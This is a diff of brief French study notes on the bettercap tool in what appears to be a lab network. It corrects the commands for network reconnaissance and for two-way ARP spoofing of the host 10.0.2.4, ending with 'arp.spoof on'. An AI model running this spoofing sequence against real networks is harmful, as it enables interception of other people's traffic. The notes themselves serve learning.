@@ -5,7 +5,7 @@ $ sudo bettercap
 10.0.2.0/24 > 10.0.2.5 » help
 >>> help generique.
 
-10.0.2.0/24 > 10.0.2.5 » help. net.recon
+10.0.2.0/24 > 10.0.2.5 » help net.recon
 >>> help précise.
 
 10.0.2.0/24 > 10.0.2.5 » net.show
@@ -16,10 +16,10 @@ $ sudo bettercap
 
 10.0.2.0/24 > 10.0.2.5 » help arp.spoof
 
-10.0.2.0/24 > 10.0.2.5 » set arp.full.duplex true
+10.0.2.0/24 > 10.0.2.5 » set arp.spoof.fullduplex true
 >>> faire du spoofing dans les deux sens.
 
-» set arp.full.targets 10.0.2.4
+» set arp.spoof.targets 10.0.2.4
 >>> faire du spoofing pour l'adresse donnée.
 
 10.0.2.0/24 > 10.0.2.5 » arp.spoof on
